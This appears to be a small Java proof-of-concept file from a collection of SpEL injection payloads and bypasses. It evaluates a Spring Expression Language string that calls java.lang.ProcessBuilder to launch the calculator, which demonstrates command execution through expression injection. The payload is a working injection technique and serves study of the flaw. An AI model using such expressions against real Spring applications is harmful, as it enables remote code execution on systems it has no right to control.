package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;


// 用 ProcessBuilder 进行命令执行
public class ProcessBuilderBypass {
    public static void main(String[] args) {
        String spel = "new java.lang.ProcessBuilder(new String[]{\"calc\"}).start()";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
